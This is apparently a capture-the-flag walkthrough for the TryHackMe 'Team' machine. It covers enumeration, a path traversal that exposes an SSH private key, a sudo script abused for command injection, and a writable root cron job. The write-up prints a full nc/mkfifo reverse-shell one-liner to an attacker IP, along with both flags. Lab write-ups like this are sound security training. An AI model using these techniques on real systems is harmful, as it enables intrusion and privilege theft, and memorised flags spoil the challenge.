
-------

#### IP Given -> **10.82.164.224**
# Description

Hey all this is my first box! It is aimed at beginners as I often see boxes that are "easy" but are often a bit harder!

**Please allow 3-5 minutes for the box to boot**

Edit 06/03/21- Just to clarify there is several ways to root this machine. One is unintended but it is just another opportunity to learn :)

_Created by:﻿dalemazza_

_Credit to P41ntP4rr0t for help along the way_

---------
# Enumaration

First thing I did was adding the **IP mapping to the /etc/hosts file**.
![[Pasted image 20251123142730.png]]


Taking a look at the team.thm, we bump into a website.
![[Pasted image 20251123142828.png]]

It looks like a **simple blog** where you can **post photos etc**.

Lets run **nmap and gobuster** to get a real **footprint** of the machine.

----

# Nmap

![[Pasted image 20251123144622.png]]

As we can see we have port **21 (ftp), 22(ssh) and 80(http)**.

None of the service versions seems vulnerable to known exploits.

----------

# Gobuster

After some time, I got these **4 endpoints**.
![[Pasted image 20251123144809.png]]

The only one I **could access was robots.txt and images**, the **rest** of them were **forbidden**.
![[Pasted image 20251123144857.png]]

Taking a **look at robots.txt** we bump into the word **dale**. It might be a **username?**
![[Pasted image 20251123145039.png]]

The **images dir only had photos being used on the website**. Yes It can have some steganography in it, but Im too lazy to check. Bad case scenario I come back to this.

Lets try to use gobuster to find **any subdomain**.
![[Pasted image 20251123154548.png]]

We found:
1. **dev.team.thm**
2. **www.dev.team.thm**

Lets **add** them to the **/etc/hosts** and **visit them**.

Both of them shows this.
![[Pasted image 20251123154830.png]]

As you can see, we have a link to something, when we clicked it, it leads us to `script.php?page=teamshare.php`. Maybe we can do some **path transversal**.

![[Pasted image 20251123154906.png]]

We are able to do that
![[Pasted image 20251123155023.png]]

With this we confirm that we have a **dale user**.
![[Pasted image 20251123155048.png]]

I managed to guess the location of the user flag.
![[Pasted image 20251123163445.png]]

==USER FLAG==
```user flag
THM{6Y0TXHz7c2d}
```

I also ran a gobuster against those two endpoints I didnt have accessed just because, and I found a script on one of those endpoints.
![[Pasted image 20251123163651.png]]
![[Pasted image 20251123163639.png]]

Since we had the ability to read any file (with enough permissions), I downloaded a word list with possible paths of important files.

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Intruders/Linux-files.txt (This one)

Since we had ssh and ftp, I decided to look into those first.

When I looked into the file `/etc/ssh/sshd_config` I found dale id_rsa file, used for ssh login.

![[Pasted image 20251123164155.png]]

The format of the key is weird, so I made a script to fix it.
![[Pasted image 20251123164610.png]]
![[Pasted image 20251123164625.png]]

After that we are able to ssh into the machine as dale.

---

# SSH

## Priv escalation to gyles

Giving the right permissions to the file we are able to login,
![[Pasted image 20251123164651.png]]

Running **sudo -l** we see that we are able to run (**as gyles**) ****/home/gyles/admin_checks**
![[Pasted image 20251123164729.png]]

Lets check that file.
![[Pasted image 20251123170138.png]]

This file is vulnerable via the variable `error`, since they ask for input and then execute that input on the line
> $error 2>/dev/null

Using the input bash, we can spawn a shell as gyles.

![[Pasted image 20251123170320.png]]

Nice, now we are gyles.

---

# Priv escalation to root

Using **linpeas.sh**, we find a file named `/usr/local/bin/main_backup.sh`.
Lets take a look into it.

```
#!/bin/bash
cp -r /var/www/team.thm/* /var/backups/www/team.thm/
```

I noticed this script was being run as a crontab by root (looking at the processes).

Also the file is writable, so we can just put `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.134.163 4444 >/tmp/f` to get a rev shell as root.
![[Pasted image 20251123171007.png]]

![[Pasted image 20251123171045.png]]

==ROOT FLAG==
```root flag
THM{fhqbznavfonq}
```

---------------